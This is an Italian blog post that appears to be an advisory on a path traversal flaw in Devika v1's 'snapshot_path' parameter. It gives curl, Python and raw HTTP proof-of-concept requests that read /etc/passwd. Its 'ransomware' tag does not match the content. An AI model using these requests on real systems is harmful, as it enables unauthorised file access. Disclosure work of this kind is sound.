---
layout: post
title: '[webapps] Devika v1 - Path Traversal via snapshot_path' 
date: 2024-08-04
categories: [security, ransomware]
---

# [webapps] Devika v1 - Path Traversal via 'snapshot_path'

## Introduzione
La presenza di una vulnerabilità di tipo Path Traversal in Devika v1 tramite il parametro 'snapshot_path' potrebbe permettere a utenti malintenzionati di accedere a file e directory al di fuori dell'ambito del server web. Questo potenziale abuso può avere un impatto significativo sulla sicurezza e sulla privacy degli utenti.

## Dettagli della Vulnerabilità
La vulnerabilità si manifesta nel momento in cui un utente malintenzionato invia una richiesta HTTP manipolata all'applicazione. Questa vulnerabilità è conosciuta come Path Traversal e consente l'accesso a file e directory al di fuori dell'ambito del server web. La vulnerabilità in questione è stata identificata in Devika v1.

## Esempio di Payload Semplice
Il comando originale è il seguente:

```bash
curl -s -L -b "COOKIE" "http://target.com/devika/v1/snapshot?snapshot_path=../../../etc/passwd"
```

## Conversione in Python del Payload Semplice
L'equivalente script Python del comando originale è il seguente:

```python
import requests

url = "http://target.com/devika/v1/snapshot"
cookies = {"COOKIE": ""}
params = {"snapshot_path": "../../../etc/passwd"}

response = requests.get(url, cookies=cookies, params=params)

print(response.text)
```

## Spiegazione Tecnica
Il comando `curl` originale invia una richiesta HTTP GET all'URL specificato, passando i cookie e inserendo il payload di Path Traversal nel parametro `snapshot_path`. Il comando cerca il file `/etc/passwd`, che è un file di sistema standard in un sistema Linux, che contiene le informazioni degli utenti del sistema.

Lo script Python fa la stessa cosa, solo usando il modulo `requests` di Python. Definisce l'URL, i cookie e i parametri della richiesta, poi esegue la richiesta GET con `requests.get()`. Infine, stampa la risposta con `print(response.text)`.

## Procedura per Riprodurre la Vulnerabilità
Un aggressore può sfruttare questa vulnerabilità seguendo questi passi:

1. Preparare una richiesta HTTP GET con il payload di Path Traversal.
2. Inserire il payload nel parametro `snapshot_path` della richiesta.
3. Inviare la richiesta all'URL dell'applicazione.

## Richiesta HTTP
La richiesta HTTP è la seguente:

```http
GET /devika/v1/snapshot?snapshot_path=../../../etc/passwd HTTP/1.1
Host: target.com
Cookie: COOKIE
```

## Impatto della Vulnerabilità
Se sfruttata, questa vulnerabilità consentirebbe ad un aggressore di accedere a file e directory al di fuori dell'ambito del server web. Questo può potenzialmente esporre informazioni sensibili, come i dati degli utenti, che possono essere utilizzati per ulteriori attacchi o per fini malevoli.

## Patch e Mitigazioni
Al momento della pubblicazione di questo articolo, non sono state rilasciate patch ufficiali per risolvere questa vulnerabilità. Tuttavia, una possibile mitigazione consiste nel limitare l'accesso ai file tramite restrizioni sul file system o attraverso l'applicazione stessa.

## Conclusione
La presenza di una vulnerabilità di tipo Path Traversal in un'applicazione può comportare gravi rischi per la sicurezza e la privacy degli utenti. È fondamentale prendere seriamente queste minacce e adottare tutte le misure necessarie per mitigarle. Nel caso di Devika v1, gli utenti dovrebbero essere consapevoli di questa vulnerabilità e prendere le adeguate precauzioni finché non verranno rilasciate patch ufficiali.

